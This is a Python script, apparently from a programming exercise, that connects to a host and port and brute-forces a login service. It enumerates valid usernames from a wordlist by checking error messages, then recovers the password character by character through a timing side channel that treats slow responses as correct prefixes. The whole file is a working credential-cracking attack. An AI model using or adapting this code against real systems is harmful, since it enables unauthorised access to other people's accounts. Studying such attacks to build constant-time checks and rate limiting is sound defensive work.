import sys
import socket
import json
import string
import time

if len(sys.argv) < 3:
    exit()

hostname = sys.argv[1]
port = int(sys.argv[2])

sock = socket.socket()

address = (hostname, port)
sock.connect(address)

file_log = open('logs.txt', 'w')

login_found = None

with open("logins.txt", "r", encoding="utf-8") as file:
    for line in file.readlines():
        login = line.rstrip()
        log_dict = {"login": login, "password": " "}
        json_data = json.dumps(log_dict)
        start = time.perf_counter()
        sock.send(json_data.encode())

        response = sock.recv(1024).decode()

        end = time.perf_counter()
        total_time = end - start

        json_answer = json.loads(response)
        if json_answer["result"] == "Wrong password!":
            login_found = login
            break

if login_found is None:
    exit()

possible_chars = string.ascii_letters + string.digits

found = False
real_password = ""
res_json = None
while not found:
    for c in possible_chars:
        password = real_password + c
        log_dict = {"login": login_found, "password": password}
        json_data = json.dumps(log_dict)
        start = time.perf_counter()

        sock.send(json_data.encode())
        response = sock.recv(1024).decode()

        end = time.perf_counter()
        total_time = end - start

        json_answer = json.loads(response)
        if json_answer["result"] == "Wrong password!":
            if total_time >= 0.05:
                real_password = password
                break
        elif json_answer["result"] == "Connection success!":
            real_password = password
            res_json = json_data
            found = True
            break
    if res_json is not None:
        break

print(res_json)

sock.close()
